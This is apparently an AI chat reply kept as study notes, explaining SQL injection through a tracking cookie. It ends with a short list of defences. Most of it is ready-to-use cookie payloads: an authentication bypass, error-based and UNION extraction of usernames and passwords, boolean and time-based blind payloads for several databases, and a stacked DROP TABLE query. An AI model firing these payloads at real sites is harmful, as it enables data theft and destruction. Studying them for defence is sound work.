


---

# 🍪 SQL Injection via Tracking Cookie ID

Many web apps store session or tracking IDs in cookies. If the server-side code concatenates cookie values directly into SQL queries **without sanitization or prepared statements**, the cookie becomes a vector for SQLi.

---

## 1. **Classic Example (MySQL, PostgreSQL, SQLite, etc.)**

**Request:**

```http
GET /profile HTTP/1.1
Host: vulnerable.site
Cookie: tracking_id=12345
```

**Injected Cookie:**

```http
Cookie: tracking_id=12345' OR '1'='1
```

**Vulnerable Query (server-side):**

```sql
SELECT * FROM users WHERE tracking_id = '12345' OR '1'='1';
```

✅ Returns all users → authentication bypass / data leak.

---

## 2. **Error-Based Injection (MySQL, Oracle, MSSQL)**

Attackers trigger verbose errors to extract DB info.

**Injected Cookie:**

```http
Cookie: tracking_id=12345' AND (SELECT 1/0)--
```

**Effect:**

- MySQL/PostgreSQL: Division by zero error leaks query details.
    
- Oracle: `ORA-00933` errors may reveal table names.
    
- MSSQL: `Divide by zero error encountered.`
    

---

## 3. **Union-Based Injection (MySQL, MSSQL, Oracle, PostgreSQL)**

Used to fetch data directly via `UNION`.

**Injected Cookie:**

```http
Cookie: tracking_id=12345' UNION SELECT username, password FROM users--
```

**Effect:**

- MySQL/Postgres → Works if column count matches.
    
- MSSQL → Needs `;--` instead of just `--`.
    
- Oracle → Requires `FROM dual`.
    

---

## 4. **Blind SQL Injection (Boolean-Based)**

For apps that don’t show errors, but behave differently based on query truth.

**Injected Cookie:**

```http
Cookie: tracking_id=12345' AND '1'='1
Cookie: tracking_id=12345' AND '1'='2
```

**Observation:**

- `1=1` → page loads normally.
    
- `1=2` → page behaves differently.
    

Works across **all major DBMS**.

---

## 5. **Time-Based Blind SQLi (MySQL, PostgreSQL, MSSQL, Oracle)**

When no error or response difference is visible, attackers rely on **delays**.

**Injected Cookie:**

```http
Cookie: tracking_id=12345' AND SLEEP(5)--   # MySQL
Cookie: tracking_id=12345' AND pg_sleep(5)-- # PostgreSQL
Cookie: tracking_id=12345' WAITFOR DELAY '0:0:5'-- # MSSQL
Cookie: tracking_id=12345' AND dbms_pipe.receive_message('a',5)-- # Oracle
```

**Effect:** Page delay confirms injection point.

---

## 6. **Stacked Queries (MSSQL, PostgreSQL, sometimes MySQL if `multiStatements=true`)**

Some DBs allow **multiple queries in one request**.

**Injected Cookie:**

```http
Cookie: tracking_id=12345'; DROP TABLE users;--
```

⚠️ Dangerous, often blocked.

- Works in **MSSQL, PostgreSQL**.
    
- MySQL needs special configs.
    
- Oracle doesn’t support stacked queries.
    

---

# 🔐 Defense Notes

1. Always use **prepared statements** / parameterized queries.
    
2. Apply **input validation** and enforce strict formats for cookies (e.g., UUID only).
    
3. Avoid exposing verbose errors.
    
4. Use **WAFs** and anomaly detection on cookie values.
    
5. Rotate & hash tracking IDs instead of raw DB values.
    

---

👉 Do you want me to also make you a **cheat sheet table (DB Type → Injection Style → Example)** for your notes so you can quickly reference them in Obsidian?